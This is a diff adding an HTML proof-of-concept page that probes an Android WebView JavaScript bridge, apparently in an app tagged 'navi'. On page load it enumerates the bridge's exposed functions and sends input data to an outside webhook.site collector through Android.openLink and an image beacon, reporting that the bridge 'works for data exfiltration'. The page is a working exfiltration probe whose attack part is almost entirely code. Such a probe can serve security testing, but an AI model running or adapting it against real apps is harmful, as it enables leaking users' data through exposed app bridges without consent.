@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Data Exfiltration Test</title>
+    <style>
+        body { font-family: Arial; padding: 20px; }
+        .result { background: #000; color: #0f0; padding: 20px; margin: 20px 0; font-family: monospace; }
+        .success { background: #d4edda; color: #155724; padding: 15px; }
+        .fail { background: #f8d7da; color: #721c24; padding: 15px; }
+    </style>
+</head>
+<body>
+    <h2>🔍 Can JS Bridge Send Data?</h2>
+    
+    <input type="text" id="testData" value="test123" placeholder="Data to send">
+    <button onclick="testExfiltration()">Test Now</button>
+    
+    <div class="result" id="result">
+        Results will appear here...
+    </div>
+    
+    <script>
+        function testExfiltration() {
+            const data = document.getElementById('testData').value;
+            const result = document.getElementById('result');
+            
+            result.innerHTML = '';
+            
+            // TEST 1: Basic JS Bridge Check
+            result.innerHTML += '<h3>📱 JS Bridge Status:</h3>';
+            if (typeof Android !== 'undefined') {
+                result.innerHTML += '✅ Android object exists<br>';
+                
+                const functions = [];
+                for (let key in Android) {
+                    if (typeof Android[key] === 'function') functions.push(key);
+                }
+                result.innerHTML += `✅ ${functions.length} functions available: ${functions.join(', ')}<br>`;
+            } else {
+                result.innerHTML += '❌ Android bridge not found<br>';
+                return;
+            }
+            
+            // TEST 2: Try to send data via openLink
+            result.innerHTML += '<h3>🚀 Testing Data Exfiltration:</h3>';
+            
+            if (Android.openLink) {
+                // Create test URL with data
+                const testURL = `https://webhook.site/geeky?test=${encodeURIComponent(data)}&time=${Date.now()}&source=navi_test`;
+                
+                result.innerHTML += `Attempting: Android.openLink("${testURL.substring(0, 60)}...")<br>`;
+                
+                try {
+                    Android.openLink(testURL);
+                    result.innerHTML += '✅ Android.openLink() executed<br>';
+                    result.innerHTML += '✅ Data SHOULD be sent to webhook.site/geeky<br>';
+                    result.innerHTML += '✅ Check https://webhook.site/#!/geeky for incoming requests<br>';
+                    
+                    // Also try a second method
+                    setTimeout(() => {
+                        const img = new Image();
+                        img.src = `https://webhook.site/geeky/beacon?data=${data}`;
+                        result.innerHTML += '<br>✅ Also tried Image beacon method<br>';
+                    }, 500);
+                    
+                } catch (e) {
+                    result.innerHTML += `❌ Error: ${e.message}<br>`;
+                }
+            } else {
+                result.innerHTML += '❌ Android.openLink not available<br>';
+            }
+            
+            // TEST 3: Verify by checking if we can open Google
+            result.innerHTML += '<h3>🔗 Verification Test:</h3>';
+            
+            setTimeout(() => {
+                if (Android.openLink) {
+                    result.innerHTML += 'Opening Google to verify JS bridge works...<br>';
+                    Android.openLink('https://google.com');
+                    result.innerHTML += '✅ If Google opened, JS bridge WORKS for data exfiltration<br>';
+                }
+            }, 1000);
+        }
+        
+        // Auto-test on load
+        window.addEventListener('load', function() {
+            setTimeout(testExfiltration, 500);
+        });
+    </script>
+</body>
+</html>
